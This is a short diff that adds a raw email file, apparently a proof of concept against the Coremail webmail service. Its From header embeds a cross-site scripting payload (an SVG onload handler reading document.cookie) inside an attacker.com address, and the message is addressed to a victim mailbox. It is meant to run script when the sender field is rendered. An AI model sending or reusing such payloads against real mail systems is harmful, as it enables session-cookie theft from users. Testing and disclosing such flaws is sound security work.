@@ -1,0 +1,7 @@
+From: <"<svg onload=alert(document.cookie)>@attacker.com">
+Subject: 1111111
+To: victim@coremail.com
+MIME-Version: 1.0
+Content-type: text/html
+
+1111111
